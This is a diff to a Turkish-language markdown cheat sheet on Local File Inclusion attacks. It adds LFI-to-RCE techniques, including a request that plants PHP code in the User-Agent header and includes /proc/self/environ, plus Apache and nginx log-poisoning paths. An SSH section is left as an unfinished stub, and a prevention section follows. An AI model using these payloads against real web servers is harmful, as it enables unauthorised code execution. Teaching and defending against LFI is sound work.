@@ -51,13 +51,24 @@ http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C
 ```
 
 # LFI to RCE
-# /proc/self/environ üzerinden RCE
+## /proc/self/environ Üzerinden RCE
 Bir log dosyası gibi çalışır. Payload User-Agent header'ına gönderilirse, bu değer /proc/self/environ içinde yansıtılır.
 ```
 GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
 User-Agent: <?=phpinfo(); ?>
 ```
 
+## Log Dosyası üzerinden
+Payload servis log dosyasına enjekte edilirse ve daha sonra log dosyası LFI ile include edilirse.
+```
+http://example.com/index.php?page=/var/log/apache/access.log
+http://example.com/index.php?page=/var/log/apache/error.log
+http://example.com/index.php?page=/var/log/nginx/access.log
+```
+
+SSH üzerinden RCE
+
+SSH girişini PHP kodu ile dene:
 
 # LFI Açığını Önlemek
 ### Input Validation & Whitelisting
